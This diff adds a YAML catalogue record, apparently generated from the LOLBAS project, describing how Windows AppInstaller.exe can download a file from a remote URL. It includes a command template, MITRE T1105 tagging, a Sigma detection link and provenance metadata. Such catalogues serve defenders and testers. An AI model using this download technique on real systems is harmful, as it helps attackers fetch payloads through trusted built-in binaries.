@@ -1,0 +1,92 @@
+id: lolbas/T1NCaW5hcmllcy9BcHBJbnN0YWxsZXIueW1s/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: AppInstaller.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml
+commands:
+- template: start ms-appinstaller://?source={REMOTEURL:.exe}
+  comment: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install
+    a package from the URL and is saved in INetCache.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: AppInstaller.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/AppInstaller.yml
+      command_source_index: 0
+      document_utf8: "---\nName: AppInstaller.exe\nDescription: Tool used for installation of AppX/MSIX\
+        \ applications on Windows 10\nAuthor: 'Wade Hickey'\nCreated: 2020-12-02\nCommands:\n  - Command:\
+        \ start ms-appinstaller://?source={REMOTEURL:.exe}\n    Description: AppInstaller.exe is spawned\
+        \ by the default handler for the URI, it attempts to load/install a package from the URL and is\
+        \ saved in INetCache.\n    Usecase: Download file from Internet\n    Category: Download\n    Privileges:\
+        \ User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Download:\
+        \ INetCache\nFull_Path:\n  - Path: C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\\
+        AppInstaller.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/dns_query/dns_query_win_lolbin_appinstaller.yml\n\
+        Resources:\n  - Link: https://twitter.com/notwhickey/status/1333900137232523264\nAcknowledgement:\n\
+        \  - Person: Wade Hickey\n    Handle: '@notwhickey'\n"
+      document_sha256: sha256:6563a3b4671700f3d5b9e7c55a5af0a8b9b138931acfe0d224fc4f226fb62ec7
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:e38c9a2ecb48e6f34132fc3e0a3fa7455bc5cbb5ffe5c5a6be843723784387f7
